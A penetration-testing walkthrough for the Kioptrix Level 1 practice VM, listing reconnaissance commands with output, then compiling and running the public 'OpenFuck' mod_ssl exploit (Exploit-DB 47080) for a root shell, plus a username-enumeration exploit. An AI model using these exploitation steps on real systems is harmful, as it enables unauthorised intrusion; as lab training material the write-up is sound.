# Walkthrough: [Kioptrix Level 1](https://www.vulnhub.com/entry/kioptrix-level-1-1,22/)

## Table of Contents

- [Enumeration](#enumeration)
- [Penetration & Privilege Escelation](#penetration--privilege-escelation)
- [Bonus](#bonus)
	- [Bruteforce](#brute-force)
	- [Intresting Files](#intresting-files)

## Enumeration
- VM IP: `sudo netdiscover`

	* `VMWare 192.168.0.14`
  
- VM info: `nmap -A -T4 -v 192.168.0.14`

  * <pre>
    22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
    80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
    111/tcp  open  rpcbind     2 (RPC #100000)
    139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
    443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
    1024/tcp open  status      1 (RPC #100024)
    </pre>
    
- Web Server Directory: `dirb -w http://192.168.0.14`

	* Default apache pages/settings.  
  
- Web Server Vurnerabilities: `nikto -h 192.168.0.14`

  * <pre>
    OSVDB-637: Enumeration of users is possible by requesting ~username (responds with 'Forbidden' for users, 'not found' for non-existent users).
    OSVDB-756.mod_ssl/2.8.4, CVE-2002-0082: mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell (difficult to exploit).
    OSVDB-3092: Files found:/test.php
    </pre>
  * [/test.php link](#intresting-files)
    
- Samba info:

  * `smbclient -L 192.168.0.14` **<--- Anon login available**  
  
    <pre>
    IPC$            IPC       IPC Service (Samba Server)
    ADMIN$          IPC       IPC Service (Samba Server)

    Server               Comment
    ---------            -------
    ANTON                Anton server (Samba, Ubuntu)
    KIOPTRIX             Samba Server
    
    Workgroup            Master
    ---------            -------
    MYGROUP              ANTON
    </pre>
  * `enum4linux4 -a -v 192.168.0.14`

- NetBIOS info: `sudo nbtscan -v 192.168.0.14`
  
  * <pre>
    NetBIOS Name Table for Host 192.168.0.14:

    Incomplete packet, 191 bytes long.
    Name             Service          Type             
    ----------------------------------------
    KIOPTRIX         <00>             UNIQUE
    KIOPTRIX         <03>             UNIQUE
    KIOPTRIX         <20>             UNIQUE
    MYGROUP          <00>              GROUP
    MYGROUP          <1e>              GROUP

    Adapter address: 00:00:00:00:00:00
    </pre>

## Penetration & Privilege Escelation
- Nikto revealed a [ssl vurnerability](https://www.exploit-db.com/exploits/47080)
	* Download and compile the exploit:   
	`cd ~/Downloads/ && sudo apt-get install libssl-dev && gcc -o OpenFuck 47080.c -lcrypto`
	* Run the exploit: `./OpenFuck 0x6b 192.168.0.14 443`
---

## Bonus

### Brute Force
- Nikto revealed an Apache vurnerability (https://www.exploit-db.com/exploits/21112) which releaves usernames that exist on the vulnerable system.
	* Download the exploit from: https://www.exploit-db.com/exploits/21112
	* Run the exploit: `./21112.php <host> <userlist> <delay>`
	
### Intresting Files
- /test.php:
  ```
  <?php4

    print "TEST";

  ?>
  ```
